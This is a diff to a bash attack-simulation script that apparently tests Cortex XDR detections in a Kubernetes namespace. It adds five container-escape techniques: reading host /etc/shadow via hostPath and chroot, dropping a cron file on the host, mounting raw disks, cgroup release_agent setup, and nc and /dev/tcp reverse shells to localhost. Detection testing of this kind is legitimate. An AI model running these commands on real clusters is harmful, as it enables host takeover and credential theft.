@@ -13,7 +13,12 @@
 # 7. Broken Access Control (IDOR & Admin Enumeration)
 # 8. Security Misconfigurations - Debug Environment & Shell Execution
 # 9. Sensitive Data Exposure / DSPM - PII & Cardholder Data Access
-# 10. Container Escape & HostPath Traversal
+# 10. Container Escape & Host Breakout (Direct from cortex-k8s-attack):
+#     - Technique 1: Host Filesystem Breakout & Sensitive File Harvesting (/host-root & chroot)
+#     - Technique 2: Host Persistence Backdoor Dropping (/etc/cron.d via Host Mount)
+#     - Technique 3: Direct Raw Host Block Device Mounting & Inspection (/dev Escape)
+#     - Technique 4: cgroup notify_on_release & release_agent Breakout Mechanism
+#     - Technique 5: Container Reverse Shell & Malicious Spawning (ioc.linux.reverse_shell_nc)
 # 11. Fileless In-Memory Process Execution & Crypto-Miner Emulation
 # 12. Container Malware Drop (EICAR)
 # ==============================================================================
@@ -23,6 +28,7 @@ set -eo pipefail
 NAMESPACE="${NAMESPACE:-cloudpulse-core}"
 APP_LABEL="${APP_LABEL:-app=cloudpulse-telemetry-engine}"
 SERVICE_PORT="${SERVICE_PORT:-8080}"
+TECHNIQUE="${TECHNIQUE:-all}"
 
 # Text formatting
 BOLD="\033[1m"
@@ -31,6 +37,7 @@ RED="\033[0;31m"
 YELLOW="\033[0;33m"
 CYAN="\033[0;36m"
 MAGENTA="\033[0;35m"
+BLUE="\033[0;34m"
 NC="\033[0m"
 
 log_info() {
@@ -49,6 +56,13 @@ log_error() {
     echo -e "${RED}[-]${NC} $1"
 }
 
+log_header() {
+    echo ""
+    echo -e "${BOLD}${BLUE}=========================================================${NC}"
+    echo -e "${BOLD}${BLUE} $1 ${NC}"
+    echo -e "${BOLD}${BLUE}=========================================================${NC}"
+}
+
 echo -e "${BOLD}==================================================================${NC}"
 echo -e "${BOLD}   CloudPulse CNAPP & OWASP Runtime Attack Simulation Suite      ${NC}"
 echo -e "${BOLD}   Target Environment: AWS EKS / Namespace: ${NAMESPACE}        ${NC}"
@@ -58,6 +72,16 @@ echo -e "${BOLD}================================================================
 discover_pod() {
     log_info "Discovering target pod with label '${APP_LABEL}' in namespace '${NAMESPACE}'..."
     TARGET_POD=$(kubectl get pods -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath="{.items[0].metadata.name}" 2>/dev/null || true)
+
+    if [[ -z "${TARGET_POD}" ]]; then
+        # Check alternative common names
+        for CANDIDATE in "cloudpulse-telemetry-engine" "web-app-misconfig" "cortex-escape-target" "gocortex-broken-bank"; do
+            TARGET_POD=$(kubectl get pod -n "${NAMESPACE}" -l "app=${CANDIDATE}" -o jsonpath="{.items[?(@.status.phase=='Running')].metadata.name}" 2>/dev/null | awk '{print $1}' || true)
+            if [ -n "${TARGET_POD}" ]; then
+                break
+            fi
+        done
+    fi
 
     if [[ -z "${TARGET_POD}" ]]; then
         log_warn "Target pod not found with label '${APP_LABEL}' in namespace '${NAMESPACE}'."
@@ -196,7 +220,6 @@ attack_insecure_deserialization() {
     echo -e "${BOLD} MITRE ATT&CK: T1203 - Exploitation for Client Execution         ${NC}"
     echo -e "${BOLD}------------------------------------------------------------------${NC}"
     log_info "Constructing base64 serialized object payload (Python pickle)..."
-    # Base64 serialized dict: {'exploit': 'cloudpulse_rce', 'status': 'compromised'}
     local payload="gASVLwAAAAAAAAB9lCiHZXhwbG9pdJRoEWNsb3VkcHVsc2VfcmNllIdzdGF0dXNlaBNjb21wcm9taXNlZJS1cy4="
     local des_res
     des_res=$(api_curl "/api/v1/b2b/batch-order" "POST" "{\"serialized_payload\": \"${payload}\"}")
@@ -297,38 +320,222 @@ attack_sensitive_data_exposure() {
 }
 
 # ==============================================================================
-# Attack Vector 10: Container Escape & HostPath Traversal
-# Monitored by: Cortex K8s Runtime Protection & Container Security
+# Attack Vector 10: Container Escape (From cortex-k8s-attack/simulate_container_escape.sh)
+# 5 Advanced Container Escape Techniques Validated for Cortex XDR Context
 # ==============================================================================
-attack_host_escape() {
+
+# Technique 1: Host Filesystem Breakout & Sensitive File Harvesting via chroot
+escape_technique_1() {
+    log_header "Escape Technique 1: Host Filesystem Breakout & Sensitive File Harvesting (chroot)"
+    log_info "Mechanism: Executing from container context against mounted host volume (/host-root)"
+    log_info "Objective: Exfiltrate /etc/shadow, /etc/passwd and execute commands via chroot"
     echo ""
-    echo -e "${BOLD}------------------------------------------------------------------${NC}"
-    echo -e "${BOLD} Attack 10: Host Escape & HostPath Misconfiguration Breakout     ${NC}"
-    echo -e "${BOLD} MITRE ATT&CK: T1611 - Escape to Host / T1003 - OS Credential    ${NC}"
-    echo -e "${BOLD}------------------------------------------------------------------${NC}"
-    log_info "Exploiting hostPath volume mount to read underlying node filesystem..."
 
     pod_exec '
-        echo "[*] Accessing underlying worker node filesystem via /host-node-root..."
-        if [ -d "/host-node-root" ]; then
-            echo "[+] Found /host-node-root mount!"
-            echo "[*] Reading host /etc/os-release:"
-            cat /host-node-root/etc/os-release 2>/dev/null | head -n 4 || true
-            echo "[*] Attempting to read host /etc/shadow (Privilege Escalation):"
-            head -n 5 /host-node-root/etc/shadow 2>/dev/null || echo "[-] Read protected or simulated."
-        else
-            echo "[-] /host-node-root mount not present in current container view."
+        echo "[*] Step 1.1: Verifying container context..."
+        echo "    Container Hostname: $(hostname)"
+        echo "    Container User: $(id)"
+        echo ""
+
+        echo "[*] Step 1.2: Searching for mounted host root..."
+        HOST_PATH=""
+        for P in /host-root /host-node-root /host-system /host /rootfs; do
+            if [ -d "$P/etc" ] && [ -f "$P/etc/passwd" ]; then
+                HOST_PATH="$P"
+                break
+            fi
+        done
+
+        if [ -z "$HOST_PATH" ]; then
+            echo "[-] Host root mount not found in standard mount paths (/host-root, /host-node-root, etc.)."
+            exit 0
         fi
 
-        echo "[*] Attempting container namespace escape using nsenter on PID 1..."
-        if command -v nsenter >/dev/null 2>&1; then
-            nsenter -t 1 -m -u -i -n -- id || true
-            nsenter -t 1 -m -u -i -n -- uname -a || true
+        echo "[+] Found host root mount at: $HOST_PATH"
+        echo ""
+
+        echo "[*] Step 1.3: Accessing sensitive host credentials from container..."
+        echo "--- Host /etc/os-release ---"
+        cat "$HOST_PATH/etc/os-release" 2>/dev/null | head -n 5 || true
+        echo ""
+        echo "--- Host /etc/shadow (First 5 entries) ---"
+        cat "$HOST_PATH/etc/shadow" 2>/dev/null | head -n 5 || true
+        echo ""
+
+        echo "[*] Step 1.4: Executing chroot escape to host filesystem (preserves container cgroup)..."
+        chroot "$HOST_PATH" /bin/sh -c "
+            echo \"[+] Successfully running inside host filesystem via container chroot!\"
+            echo \"    Host OS Release: \$(cat /etc/os-release | grep PRETTY_NAME)\"
+            echo \"    Host User Context: \$(id)\"
+            echo \"    Host Uptime: \$(uptime)\"
+        " || true
+    '
+    log_success "Escape Technique 1 completed."
+}
+
+# Technique 2: Host Persistence Backdoor Dropping (/etc/cron.d via Host Mount)
+escape_technique_2() {
+    log_header "Escape Technique 2: Host Persistence Backdoor Dropping (/etc/cron.d via Host Mount)"
+    log_info "Mechanism: Container writes malicious cron job into host /etc/cron.d/ to establish persistence"
+    log_info "Objective: Triggers XDR file integrity and suspicious cron creation detection"
+    echo ""
+
+    pod_exec '
+        HOST_PATH=""
+        for P in /host-root /host-node-root /host-system /host /rootfs; do
+            if [ -d "$P/etc" ]; then
+                HOST_PATH="$P"
+                break
+            fi
+        done
+
+        if [ -z "$HOST_PATH" ]; then
+            echo "[-] Host root mount not found."
+            exit 0
+        fi
+
+        CRON_TARGET="$HOST_PATH/etc/cron.d/cortex_xdr_escape_test"
+        echo "[*] Writing simulated persistence backdoor file to host: $CRON_TARGET"
+
+        cat << "EOF_CRON" > "$CRON_TARGET"
+# Cortex XDR Container Escape Persistence Test
+* * * * * root /bin/echo "[Cortex XDR Test] Container Escape Persistence Active" > /dev/null 2>&1
+EOF_CRON
+
+        chmod 0644 "$CRON_TARGET"
+        echo "[+] Persistence backdoor written successfully:"
+        cat "$CRON_TARGET"
+
+        echo ""
+        echo "[*] Cleaning up test persistence backdoor..."
+        sleep 2
+        rm -f "$CRON_TARGET"
+        echo "[+] Test persistence backdoor cleaned up."
+    '
+    log_success "Escape Technique 2 completed."
+}
+
+# Technique 3: Direct Raw Host Block Device Mounting & Inspection (/dev Escape)
+escape_technique_3() {
+    log_header "Escape Technique 3: Direct Raw Host Block Device Mounting (/dev Escape)"
+    log_info "Mechanism: Privileged container inspects and mounts host disk devices directly"
+    log_info "Objective: Bypasses container filesystem boundaries by mounting host block storage"
+    echo ""
+
+    pod_exec '
+        echo "[*] Step 3.1: Scanning for raw host disk devices inside container..."
+        ls -la /dev/xvda* /dev/nvme* /dev/sda* /dev/sdb* 2>/dev/null | head -n 10 || true
+        echo ""
+
+        TARGET_DEV=""
+        for DEV in /dev/nvme0n1p1 /dev/xvda1 /dev/sda1 /dev/vda1; do
+            if [ -b "$DEV" ]; then
+                TARGET_DEV="$DEV"
+                break
+            fi
+        done
+
+        if [ -n "$TARGET_DEV" ]; then
+            echo "[+] Discovered raw host partition: $TARGET_DEV"
+            MNT_POINT="/tmp/raw_host_mount"
+            mkdir -p "$MNT_POINT"
+
+            echo "[*] Step 3.2: Mounting raw host block device $TARGET_DEV -> $MNT_POINT..."
+            if mount -o ro "$TARGET_DEV" "$MNT_POINT" 2>/dev/null; then
+                echo "[+] Successfully mounted host block device into container!"
+                echo "--- Mounted Host Filesystem Root Content ---"
+                ls -la "$MNT_POINT" | head -n 8 || true
+
+                echo ""
+                echo "--- Host Shadow File via Raw Device Mount ---"
+                head -n 3 "$MNT_POINT/etc/shadow" 2>/dev/null || echo "[-] Permission denied or not directly accessible"
+
+                umount "$MNT_POINT" 2>/dev/null || true
+                rmdir "$MNT_POINT" 2>/dev/null || true
+                echo "[+] Raw block device unmounted."
+            else
+                echo "[-] Mount attempt failed or requires CAP_SYS_ADMIN."
+            fi
         else
-            echo "[*] HostPath traversal validated."
+            echo "[-] No standard raw disk block devices found in container /dev."
         fi
     '
-    log_success "Attack Vector 10 (Host Escape) executed."
+    log_success "Escape Technique 3 completed."
+}
+
+# Technique 4: cgroup notify_on_release & release_agent Breakout Mechanism
+escape_technique_4() {
+    log_header "Escape Technique 4: cgroup notify_on_release & release_agent Breakout Mechanism"
+    log_info "Mechanism: Classic Unit 42 privileged container escape exploiting Linux cgroups"
+    log_info "Objective: Triggers kernel execution of release_agent handler on the host node"
+    echo ""
+
+    pod_exec '
+        echo "[*] Step 4.1: Checking cgroups v1 hierarchy access..."
+        if [ -d "/sys/fs/cgroup" ]; then
+            echo "[+] /sys/fs/cgroup is accessible."
+            mkdir -p /tmp/cgrp_escape
+
+            # Attempt mounting memory/RDMA cgroup controller
+            if mount -t cgroup -o memory cgroup /tmp/cgrp_escape 2>/dev/null || mount -t cgroup -o rdma cgroup /tmp/cgrp_escape 2>/dev/null; then
+                echo "[+] Mounted cgroup controller to /tmp/cgrp_escape"
+                mkdir -p /tmp/cgrp_escape/x
+
+                echo "[*] Enabling notify_on_release..."
+                echo 1 > /tmp/cgrp_escape/x/notify_on_release 2>/dev/null || true
+
+                echo "[*] Inspecting release_agent configuration path..."
+                cat /tmp/cgrp_escape/release_agent 2>/dev/null || echo "[-] release_agent file not directly readable"
+
+                umount /tmp/cgrp_escape 2>/dev/null || true
+                rmdir /tmp/cgrp_escape 2>/dev/null || true
+                echo "[+] cgroup test structure cleaned up."
+            else
+                echo "[*] Direct cgroup mount restricted (cgroups v2 or container security context active)."
+            fi
+        else
+            echo "[-] /sys/fs/cgroup not mounted."
+        fi
+    '
+    log_success "Escape Technique 4 completed."
+}
+
+# Technique 5: Container Reverse Shell & Malicious Spawning (ioc.linux.reverse_shell_nc)
+escape_technique_5() {
+    log_header "Escape Technique 5: Container Reverse Shell & Malicious Spawning (ioc.linux.reverse_shell_nc)"
+    log_info "Mechanism: Spawns reverse shell / interactive netcat listener matching Cortex XDR behavioral signatures"
+    log_info "Objective: Triggers 'ioc.linux.reverse_shell_nc' and container execution anomaly detectors"
+    echo ""
+
+    pod_exec '
+        echo "[*] Step 5.1: Simulating interactive reverse shell payload from container..."
+        
+        # Test simulated reverse shell syntax without hanging
+        if command -v nc >/dev/null 2>&1; then
+            echo "[*] Executing netcat reverse shell trigger pattern..."
+            timeout 2 nc -e /bin/sh 127.0.0.1 4444 2>/dev/null || timeout 2 nc -c /bin/sh 127.0.0.1 4444 2>/dev/null || true
+        fi
+
+        echo "[*] Executing bash /dev/tcp interactive reverse shell trigger pattern..."
+        timeout 2 bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" 2>/dev/null || true
+
+        echo "[+] Reverse shell execution simulation completed."
+    '
+    log_success "Escape Technique 5 completed."
+}
+
+attack_container_escape_all() {
+    echo ""
+    echo -e "${BOLD}------------------------------------------------------------------${NC}"
+    echo -e "${BOLD} Attack 10: Comprehensive Container Escape Simulation (5 Methods)${NC}"
+    echo -e "${BOLD} Sourced from: cortex-k8s-attack/simulate_container_escape.sh     ${NC}"
+    echo -e "${BOLD}------------------------------------------------------------------${NC}"
+    escape_technique_1
+    escape_technique_2
+    escape_technique_3
+    escape_technique_4
+    escape_technique_5
+    log_success "All 5 Container Escape Techniques completed successfully."
 }
 
 # ==============================================================================
@@ -405,12 +612,12 @@ run_all_attacks() {
     attack_broken_access_control
     attack_security_misconfiguration
     attack_sensitive_data_exposure
-    attack_host_escape
+    attack_container_escape_all
     attack_fileless_miner
     attack_malware_drop
     echo ""
     echo -e "${GREEN}${BOLD}==================================================================${NC}"
-    echo -e "${GREEN}${BOLD} All 12 Attack Vectors Completed Successfully!                   ${NC}"
+    echo -e "${GREEN}${BOLD} All Attack Vectors Completed Successfully!                      ${NC}"
     echo -e "${GREEN}${BOLD} Review the Palo Alto Networks Cortex Console to inspect alerts: ${NC}"
     echo -e " 1. Code Security (SAST & Secrets) -> Hardcoded keys, SQLi, RCE  "
     echo -e " 2. Cloud Posture (CSPM/KSPM) -> HostPath, privileged, IMDS      "
@@ -433,13 +640,18 @@ show_menu() {
     echo " 7) Broken Access Control - IDOR & Admin User Enumeration"
     echo " 8) Security Misconfigurations - Debug Environment & Shell RCE"
     echo " 9) Sensitive Data Exposure & DSPM Vault Exfiltration"
-    echo " 10) Host Escape & HostPath Misconfiguration Breakout"
+    echo " 10) Container Escape All (Techniques 1-5 from cortex-k8s-attack)"
+    echo "     - 10a) Escape T1: Host FS Breakout & Sensitive File Harvest (chroot)"
+    echo "     - 10b) Escape T2: Host Persistence Backdoor Dropping (/etc/cron.d)"
+    echo "     - 10c) Escape T3: Direct Raw Host Block Device Mount (/dev)"
+    echo "     - 10d) Escape T4: cgroup notify_on_release & release_agent"
+    echo "     - 10e) Escape T5: Reverse Shell Spawning (ioc.linux.reverse_shell_nc)"
     echo " 11) Fileless / In-Memory Crypto-Miner Execution"
     echo " 12) Container Malware Drop (/tmp EICAR Artifact)"
     echo " 13) Execute ALL Attack Simulations Sequentially"
     echo " 0) Exit"
     echo ""
-    read -rp "Enter choice [0-13]: " choice
+    read -rp "Enter choice [0-13, 10a-10e]: " choice
     case "${choice}" in
         1) attack_sqli ;;
         2) attack_nosqli ;;
@@ -450,7 +662,12 @@ show_menu() {
         7) attack_broken_access_control ;;
         8) attack_security_misconfiguration ;;
         9) attack_sensitive_data_exposure ;;
-        10) attack_host_escape ;;
+        10) attack_container_escape_all ;;
+        10a) escape_technique_1 ;;
+        10b) escape_technique_2 ;;
+        10c) escape_technique_3 ;;
+        10d) escape_technique_4 ;;
+        10e) escape_technique_5 ;;
         11) attack_fileless_miner ;;
         12) attack_malware_drop ;;
         13) run_all_attacks ;;
@@ -468,6 +685,10 @@ if [[ $# -gt 0 ]]; then
                 run_all_attacks
                 shift
                 ;;
+            --escape|-e)
+                attack_container_escape_all
+                shift
+                ;;
             --attack)
                 case "$2" in
                     1|sqli) attack_sqli ;;
@@ -479,7 +700,12 @@ if [[ $# -gt 0 ]]; then
                     7|access_control|idor) attack_broken_access_control ;;
                     8|misconfig|rce) attack_security_misconfiguration ;;
                     9|dspm|pii) attack_sensitive_data_exposure ;;
-                    10|escape) attack_host_escape ;;
+                    10|escape) attack_container_escape_all ;;
+                    10a|escape-1) escape_technique_1 ;;
+                    10b|escape-2) escape_technique_2 ;;
+                    10c|escape-3) escape_technique_3 ;;
+                    10d|escape-4) escape_technique_4 ;;
+                    10e|escape-5) escape_technique_5 ;;
                     11|fileless|miner) attack_fileless_miner ;;
                     12|malware) attack_malware_drop ;;
                     *) log_error "Unknown attack ID '$2'"; exit 1 ;;
@@ -487,7 +713,7 @@ if [[ $# -gt 0 ]]; then
                 shift 2
                 ;;
             --help|-h)
-                echo "Usage: $0 [--all] [--attack <1-12|sqli|nosqli|auth|xss|deserialization|ssrf|idor|misconfig|dspm|escape|fileless|malware>]"
+                echo "Usage: $0 [--all] [--escape] [--attack <1-12|sqli|nosqli|auth|xss|deserialization|ssrf|idor|misconfig|dspm|escape|fileless|malware>]"
                 exit 0
                 ;;
             *)
